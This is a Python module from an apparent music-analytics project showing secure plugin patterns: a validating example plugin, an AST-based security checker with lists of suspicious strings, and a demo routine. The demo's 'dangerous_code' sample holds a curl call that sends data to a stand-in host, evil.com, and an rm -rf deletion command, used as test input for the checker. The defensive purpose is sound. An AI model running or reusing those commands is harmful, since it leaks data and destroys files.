"""
Security examples and validation patterns for open-source plugin development.

This module provides examples of secure plugin development patterns and
demonstrates how to avoid common security pitfalls when creating music
analytics plugins.
"""

import ast
import logging
import time
from typing import List

import pandas as pd

from src.data_organization.notebook_validator import ValidationResult
from src.data_organization.open_source_plugin_framework import (
    OpenSourceScoringPlugin,
    PluginMetadata,
    PluginSecurityChecker,
)

logger = logging.getLogger(__name__)


class SecurePluginExample(OpenSourceScoringPlugin):
    """
    Example of a secure plugin implementation following best practices.

    This plugin demonstrates:
    - Safe data operations
    - Proper input validation
    - Resource management
    - Error handling
    - Configuration validation
    """

    def get_name(self) -> str:
        return "secure_example"

    def get_version(self) -> str:
        return "1.0.0"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="secure_example",
            version="1.0.0",
            author="Security Team",
            description="Example of secure plugin development practices",
            parameters={
                "threshold": 0.5,
                "max_records": 10000,
                "timeout_seconds": 30,
            },
            input_requirements=["entity_id", "metric_value"],
            output_schema={"entity_id": "object", "security_score": "float64"},
            tags=["security", "example", "best-practices"],
        )

    def validate_input(self, data: pd.DataFrame) -> ValidationResult:
        """Comprehensive input validation with security checks."""
        result = ValidationResult(is_valid=True, errors=[], warnings=[], checked_items=0, passed_items=0)

        # Check required columns
        required_cols = self.get_metadata().input_requirements
        for col in required_cols:
            result.checked_items += 1
            if col not in data.columns:
                result.add_error(f"Required column '{col}' not found")
            else:
                result.passed_items += 1

        # Security: Check data size limits
        max_records = self.config.get("max_records", 10000)
        result.checked_items += 1
        if len(data) > max_records:
            result.add_error(f"Data size ({len(data)}) exceeds maximum allowed ({max_records})")
        else:
            result.passed_items += 1

        # Security: Validate data types to prevent injection
        if "metric_value" in data.columns:
            result.checked_items += 1
            if not pd.api.types.is_numeric_dtype(data["metric_value"]):
                result.add_error("metric_value must be numeric to prevent injection attacks")
            else:
                result.passed_items += 1

        # Security: Check for suspicious patterns in string columns
        if "entity_id" in data.columns:
            result.checked_items += 1
            suspicious_patterns = ["<script", "javascript:", "eval\\(", "exec\\(", "__import__"]
            for pattern in suspicious_patterns:
                if data["entity_id"].astype(str).str.contains(pattern, case=False, na=False, regex=True).any():
                    result.add_error(f"Suspicious pattern '{pattern}' detected in entity_id")
                    break
            else:
                result.passed_items += 1

        return result

    def calculate_scores(self, data: pd.DataFrame) -> pd.DataFrame:
        """Secure score calculation with proper resource management."""
        self._record_execution_start()

        try:
            # Security: Implement timeout protection
            start_time = time.time()
            timeout = self.config.get("timeout_seconds", 30)

            # Security: Work with a copy to prevent data modification
            safe_data = data.copy()

            # Security: Validate configuration parameters
            threshold = self.config.get("threshold", 0.5)
            if not isinstance(threshold, (int, float)) or threshold < 0 or threshold > 1:
                raise ValueError("threshold must be a number between 0 and 1")

            results = []

            for idx, row in safe_data.iterrows():
                # Security: Check timeout
                if time.time() - start_time > timeout:
                    raise TimeoutError(f"Plugin execution exceeded {timeout} seconds")

                entity_id = str(row["entity_id"])  # Ensure string type
                metric_value = float(row["metric_value"])  # Ensure numeric type

                # Safe calculation using only built-in operations
                security_score = min(max(metric_value * threshold, 0.0), 1.0)

                results.append({"entity_id": entity_id, "security_score": security_score})

            result_df = pd.DataFrame(results)

            self._record_execution_end(True)
            return result_df

        except Exception as e:
            self._record_execution_end(False, str(e))
            raise

    def _validate_configuration(self) -> None:
        """Enhanced configuration validation with security checks."""
        super()._validate_configuration()

        # Validate threshold
        threshold = self.config.get("threshold", 0.5)
        if not isinstance(threshold, (int, float)) or threshold < 0 or threshold > 1:
            raise ValueError("threshold must be a number between 0 and 1")

        # Validate max_records
        max_records = self.config.get("max_records", 10000)
        if not isinstance(max_records, int) or max_records <= 0 or max_records > 100000:
            raise ValueError("max_records must be a positive integer <= 100000")

        # Validate timeout
        timeout = self.config.get("timeout_seconds", 30)
        if not isinstance(timeout, (int, float)) or timeout <= 0 or timeout > 300:
            raise ValueError("timeout_seconds must be a positive number <= 300")


class AdvancedSecurityChecker(PluginSecurityChecker):
    """
    Enhanced security checker with additional validation patterns.

    This extends the base security checker with more sophisticated
    detection patterns for music analytics plugins.
    """

    def __init__(self):
        super().__init__()

        # Additional dangerous patterns specific to data analysis
        self.dangerous_data_operations = [
            "to_sql",  # Database writes
            "read_sql",  # Uncontrolled database reads
            "to_pickle",  # Pickle serialization (security risk)
            "read_pickle",  # Pickle deserialization (security risk)
            "query",  # DataFrame query with potential injection
        ]

        # Suspicious string patterns
        self.suspicious_strings = [
            "DROP TABLE",
            "DELETE FROM",
            "INSERT INTO",
            "UPDATE SET",
            "<script",
            "javascript:",
            "data:text / html",
        ]

    def check_plugin_security(self, plugin_code: str) -> ValidationResult:
        """Enhanced security check with additional patterns."""
        result = super().check_plugin_security(plugin_code)

        try:
            tree = ast.parse(plugin_code)

            # Check for dangerous data operations
            result.checked_items += 1
            dangerous_data_ops = self._check_dangerous_data_operations(tree)
            if dangerous_data_ops:
                result.add_error(f"Dangerous data operations detected: {', '.join(dangerous_data_ops)}")
            else:
                result.passed_items += 1

            # Check for suspicious string literals
            result.checked_items += 1
            suspicious_strings = self._check_suspicious_strings(tree)
            if suspicious_strings:
                result.add_warning(f"Suspicious string patterns detected: {', '.join(suspicious_strings)}")
                result.passed_items += 1
            else:
                result.passed_items += 1

            # Check for proper error handling
            result.checked_items += 1
            has_error_handling = self._check_error_handling(tree)
            if not has_error_handling:
                result.add_warning("Plugin should include proper error handling (try / except blocks)")
            result.passed_items += 1

        except SyntaxError as e:
            result.add_error(f"Plugin code has syntax errors: {str(e)}")

        return result

    def _check_dangerous_data_operations(self, tree: ast.AST) -> List[str]:
        """Check for dangerous data manipulation operations."""
        dangerous_found = []

        for node in ast.walk(tree):
            if isinstance(node, ast.Attribute):
                if node.attr in self.dangerous_data_operations:
                    dangerous_found.append(node.attr)

        return list(set(dangerous_found))

    def _check_suspicious_strings(self, tree: ast.AST) -> List[str]:
        """Check for suspicious string literals."""
        suspicious_found = []

        for node in ast.walk(tree):
            if isinstance(node, ast.Str):
                for pattern in self.suspicious_strings:
                    if pattern.lower() in node.s.lower():
                        suspicious_found.append(pattern)

        return list(set(suspicious_found))

    def _check_error_handling(self, tree: ast.AST) -> bool:
        """Check if plugin includes proper error handling."""
        for node in ast.walk(tree):
            if isinstance(node, ast.Try):
                return True
        return False

    def validate_plugin_resource_usage(
        self, plugin: OpenSourceScoringPlugin, test_data: pd.DataFrame
    ) -> ValidationResult:
        """
        Validate plugin resource usage with real data.

        This method tests the plugin with actual data to ensure it
        behaves properly under realistic conditions.
        """
        result = ValidationResult(is_valid=True, errors=[], warnings=[], checked_items=0, passed_items=0)

        try:
            # Test memory usage
            result.checked_items += 1
            import os

            import psutil

            process = psutil.Process(os.getpid())
            memory_before = process.memory_info().rss / 1024 / 1024  # MB

            # Execute plugin
            start_time = time.time()
            plugin_results = plugin.calculate_scores(test_data)
            execution_time = time.time() - start_time

            memory_after = process.memory_info().rss / 1024 / 1024  # MB
            memory_used = memory_after-memory_before

            # Check execution time
            if execution_time > 60:  # 1 minute limit
                result.add_error(f"Plugin execution took {execution_time:.2f} seconds (limit: 60s)")
            elif execution_time > 30:  # Warning at 30 seconds
                result.add_warning(f"Plugin execution took {execution_time:.2f} seconds-consider optimization")
            else:
                result.passed_items += 1

            # Check memory usage
            result.checked_items += 1
            if memory_used > 500:  # 500MB limit
                result.add_error(f"Plugin used {memory_used:.1f}MB memory (limit: 500MB)")
            elif memory_used > 100:  # Warning at 100MB
                result.add_warning(f"Plugin used {memory_used:.1f}MB memory-consider optimization")
            else:
                result.passed_items += 1

            # Validate output
            result.checked_items += 1
            if plugin_results is None or len(plugin_results) == 0:
                result.add_error("Plugin returned empty or null results")
            else:
                result.passed_items += 1

        except Exception as e:
            result.add_error(f"Plugin resource validation failed: {str(e)}")

        return result


def demonstrate_security_patterns():
    """
    Demonstrate secure and insecure plugin patterns.

    This function shows examples of what to do and what to avoid
    when developing music analytics plugins.
    """
    print("🔒 Plugin Security Demonstration")
    print("=" * 50)

    # Example 1: Secure plugin
    print("\n✅ SECURE PLUGIN EXAMPLE:")
    secure_plugin = SecurePluginExample()

    # Test with safe data
    safe_data = pd.DataFrame({"entity_id": ["artist_1", "artist_2", "artist_3"], "metric_value": [0.75, 0.45, 0.90]})

    secure_plugin.load_configuration({"threshold": 0.6, "max_records": 1000})

    validation_result = secure_plugin.validate_input(safe_data)
    print(f"Input validation: {'✅ PASS' if validation_result.is_valid else '❌ FAIL'}")

    if validation_result.is_valid:
        results = secure_plugin.calculate_scores(safe_data)
        print(f"Calculation: ✅ SUCCESS ({len(results)} records processed)")

    # Example 2: Security checker
    print("\n🔍 SECURITY CHECKER EXAMPLE:")
    security_checker = AdvancedSecurityChecker()

    # Test safe code
    safe_code = """
import pandas as pd
import numpy as np

def calculate_scores(self, data):
    try:
        result = data.copy()
        result['score'] = data['metric_value'] * 0.5
        return result
    except Exception as e:
        self._record_execution_end(False, str(e))
        raise
"""

    safe_result = security_checker.check_plugin_security(safe_code)
    print(f"Safe code check: {'✅ PASS' if safe_result.is_valid else '❌ FAIL'}")

    # Test dangerous code
    dangerous_code = """
import os
import subprocess

def malicious_function(self, data):
    os.system("curl http://evil.com / steal?data=" + str(data))
    subprocess.call(["rm", "-rf", "/important / files"])
    return data
"""

    dangerous_result = security_checker.check_plugin_security(dangerous_code)
    print(f"Dangerous code check: {'❌ BLOCKED' if not dangerous_result.is_valid else '⚠️  MISSED'}")

    if not dangerous_result.is_valid:
        print(f"Security errors detected: {len(dangerous_result.errors)}")
        for error in dangerous_result.errors[:2]:  # Show first 2 errors
            print(f"  - {error}")

    print("\n🎯 SECURITY RECOMMENDATIONS:")
    print("1. Always validate input data types and ranges")
    print("2. Implement timeouts for long-running operations")
    print("3. Use try / except blocks for error handling")
    print("4. Avoid file system and network operations")
    print("5. Sanitize string inputs to prevent injection")
    print("6. Limit memory and CPU usage")
    print("7. Use the security checker before deployment")


if __name__ == "__main__":
    demonstrate_security_patterns()
